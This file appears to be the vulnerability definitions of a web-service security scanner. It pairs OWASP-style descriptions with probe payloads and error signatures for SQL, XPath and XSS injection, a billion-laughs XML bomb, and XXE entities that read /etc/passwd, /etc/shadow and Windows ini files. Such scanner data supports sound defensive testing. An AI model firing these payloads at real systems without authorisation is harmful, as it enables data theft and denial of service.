<?xml version="1.0" encoding="utf-8" ?>
<Vulnerabilities>
  <Vulnerability>
    <id>0</id>
    <title>Insecure Communication - SSL Not Used</title>
    <description>Insecure communication means that an attacker who can sniff traffic from the network will be able to access the conversation, 
    including any credentials or sensitive information transmitted.</description>
    <link>http://www.hpenterprisesecurity.com/vulncat/en/vulncat/webservices/weak_ws-securitypolicy_insecure_transport.html</link>
    <severity>High</severity>
    <request>
    </request>
    <response>
    </response>
    <statusCode></statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>1</id>
    <title>Unauthenticated Service Method</title>
    <description>Insufficient Authentication occurs when a web service permits an attacker to access sensitive function without having to 
    properly authenticate.</description>
    <link>http://projects.webappsec.org/w/page/13246939/Insufficient%20Authentication</link>
    <severity>High</severity>
    <request>
    </request>
    <response>
    </response>
    <statusCode>401</statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>2</id>
    <title>Error Based SQL Injection</title>
    <description>A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. 
    A successful SQL injection exploit can read sensitive data from the database, modify database data, 
    execute administration operations on the database etc.</description>
    <link>https://www.owasp.org/index.php/SQL_Injection</link>
    <severity>Critical</severity>
    <request>
      <payload>'</payload>
      <payload>"</payload>
      <payload>'"</payload>
      <payload>;</payload>
      <payload>)</payload>
      <payload>(</payload>
      <payload>--</payload>
      <payload>1' or 1=1--</payload>
      <payload>a%' or 1=1--</payload>
	    <payload>1' or 1=1</payload>
      <payload>a%' or 1=1</payload>
	    <payload>999999 or 1=1 or 1=1</payload>
      <payload>' or 1=1 or '1'='1</payload>
      <payload>" or 1=1 or "1"="1</payload>
      <payload>999999) or 1=1 or (1=1</payload>
      <payload>') or 1=1 or ('1'='1</payload>
      <payload>") or 1=1 or ("1"="1</payload>
      <payload>999999)) or 1=1 or ((1=1</payload>
      <payload>')) or 1=1 or (('1'='1</payload>
      <payload>")) or 1=1 or (("1"="1</payload>
      <payload>999999))) or 1=1 or (((1</payload>
      <payload>'))) or 1=1 or ((('1'='1</payload>
      <payload>"))) or 1=1 or ((("1"="1</payload>
    </request>
    <response>
      <text>Incorrect Syntax</text>
      <text>Invalid Syntax</text>
      <text>Runtime Error</text>
      <text>Syntax Error</text>
      <text>Runtime Errors</text>
      <text>You have an error in your SQL syntax</text>
      <text>quoted string not properly terminated</text>
      <text>unterminated quoted string</text>
      <text>SQLite exception</text>
      <text>Invalid SQL statement or JDBC escape</text>
      <text>Invalid Column</text>
      <text>Conversion failed</text>
      <text>Cannot open database</text>
      <text>System.Data.SqlClient.SqlException</text>
    </response>
    <statusCode></statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>3</id>
    <title>Cross Site Scripting</title>
    <description>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign 
    and trusted web sites.</description>
    <link>https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</link>
    <severity>Critical</severity>
    <request>
      <payload>
        <![CDATA[
        <script>alert(1)</script>
        ]]>
      </payload>
      <payload>
        <![CDATA[
        <img src=x onerror=alert(1)>
        ]]>
      </payload>
	  <payload>
        <![CDATA[
		1"><script>alert(document.cookie)</script>
		]]>
      </payload>
    </request>
    <response>
      <text>
        <![CDATA[
        <script>alert(1)</script>
        ]]>
      </text>
      <text>
        <![CDATA[
        <img src=x onerror=alert(1)>
        ]]>
      </text>
	  <text>
        <![CDATA[
		1"><script>alert(document.cookie)</script>
		]]>
      </text>
    </response>
    <statusCode></statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>4</id>
    <title>XML Bomb</title>
    <description>An XML bomb is a message composed and sent with the intent of overloading an XML parser (typically HTTP server). 
    It is block of XML that is both well-formed and valid according to the rules of an XML schema. 
    It is a type of XML Denial of Service (DoS) attack.</description>
    <link>https://en.wikipedia.org/wiki/Billion_laughs</link>
    <severity>Critical</severity>
    <request>
      <payload>
        <![CDATA[
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
        ]]>
      </payload>
      <payload>
        <![CDATA[
        <!DOCTYPE lolz [
            <!ENTITY loadui SYSTEM "https://notepad-plus-plus.org/repository/6.x/6.8.8/npp.6.8.8.Installer.exe">
        ]>
        <lolz>&loadui;</lolz>
        ]]>
      </payload>
    </request>
    <response>
    </response>
    <statusCode>408</statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>5</id>
    <title>External Entity Attack - XXE</title>
    <description>An XML External Entity attack is a type of attack against an application that parses XML input. 
    This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. 
    This attack may lead to the disclosure of confidential data, denial of service, port scanning from the perspective of the machine 
    where the parser is located, and other system impacts.</description>
    <link>https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</link>
    <severity>Critical</severity>
    <request>
      <payload>
        <![CDATA[
          <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
        ]]>
      </payload>
      <payload>
        <![CDATA[
          <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
        ]]>
      </payload>
      <payload>
        <![CDATA[
          <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
        ]]>
      </payload>
      <payload>
        <![CDATA[
          <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///c:/winnt/win.ini" >]><foo>&xxe;</foo>
        ]]>
      </payload>
      <payload>
        <![CDATA[
          <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "http://www.google.com/" >]><foo>&xxe;</foo>
        ]]>
      </payload>
    </request>
    <response>
      <text>boot loader</text>
      <text>root</text>
      <text>html</text>
      <text>ini</text>
      <text>xxe</text>
      <text>shadow</text>
      <text>passwd</text>
      <text>www.google.com</text>
    </response>
    <statusCode>500</statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>6</id>
    <title>XPATH Injection</title>
    <description>XPath is a "simple" language to locate information in an XML document. 
    Similar to SQL Injection, XPath Injection attacks occur when an application uses user-supplied information 
    to construct an XPath query for XML data. By sending intentionally malformed information into the web site, 
    an attacker can find out how the XML data is structured, or access data that he may not normally have access to.</description>
    <link>https://www.owasp.org/index.php/XPATH_Injection</link>
    <severity>Critical</severity>
    <request>
      <payload>1' or 1=1</payload>
      <payload>a%' or 1=1</payload>
      <payload>' or '1' = '1</payload>
      <payload>a' or 1=1 or 'a'='a</payload>
    </request>
    <response>
      <text>Incorrect Syntax</text>
      <text>Invalid Syntax</text>
      <text>Runtime Error</text>
      <text>Syntax Error</text>
      <text>Runtime Errors</text>
      <text>XPathException</text>
      <text>System.Xml.XPath</text>
      <text>has an invalid token</text>
    </response>
    <statusCode></statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>7</id>
    <title>Verbose SOAP Fault Message</title>
    <description>Web Services that generate verbose fault messages are useful to developers and system administrators. 
    However, the same messages can give away too much information in operational environments to attackers as well.</description>
    <link>https://www.nsa.gov/ia/_files/factsheets/soa_security_vulnerabilities_web.pdf</link>
    <severity>Medium</severity>
    <request>
    </request>
    <response>
    </response>
    <statusCode></statusCode>
    <type>1</type>
  </Vulnerability>
  <Vulnerability>
    <id>8</id>
    <title>Verbose Exception Message</title>
    <description>
      Web Services that generate verbose fault messages are useful to developers and system administrators.
      However, the same messages can give away too much information in operational environments to attackers as well.
    </description>
    <link>https://www.nsa.gov/ia/_files/factsheets/soa_security_vulnerabilities_web.pdf</link>
    <severity>Medium</severity>
    <request>
    </request>
    <response>
    </response>
    <statusCode></statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>9</id>
    <title>HTTP OPTIONS is enabled</title>
    <description>
      The OPTIONS method represents a request for information about the communication options available on the request/response chain identified by the Request-URI. 
      This method allows the client to determine the options and/or requirements associated with a resource.
    </description>
    <link>https://www.owasp.org/index.php/Test_HTTP_Methods_(OTG-CONFIG-006)</link>
    <severity>Medium</severity>
    <request>
    </request>
    <response>
    </response>
    <statusCode>200</statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>10</id>
    <title>Cross Site Tracing</title>
    <description>
      A Cross-Site Tracing (XST) attack involves the use of Cross-site Scripting (XSS) and the TRACE or TRACK HTTP methods. 
      According to RFC 2616, "TRACE allows the client to see what is being received at the other end of the request chain and use that data for testing or diagnostic information.", 
      the TRACK method works in the same way but is specific to Microsoft's IIS web server.
    </description>
    <link>https://www.owasp.org/index.php/Cross_Site_Tracing</link>
    <severity>Medium</severity>
    <request>
    </request>
    <response>
    </response>
    <statusCode>200</statusCode>
    <type>3</type>
  </Vulnerability>
  <Vulnerability>
    <id>-1</id>
    <title>Could not establish trust relationship for the SSL/TLS secure channel.</title>
    <description>
      Problem with this web service's SSL security certificate. The remote certificate is invalid according to the validation procedure (maybe self-signed SSL Certificate).
    </description>
    <link>https://www.sans.org/reading-room/whitepapers/analyst/critical-security-controls-guidelines-ssl-tls-management-35995</link>
    <severity>High</severity>
    <request>
    </request>
    <response>
    </response>
    <statusCode></statusCode>
  </Vulnerability>
  <type>3</type>
</Vulnerabilities>
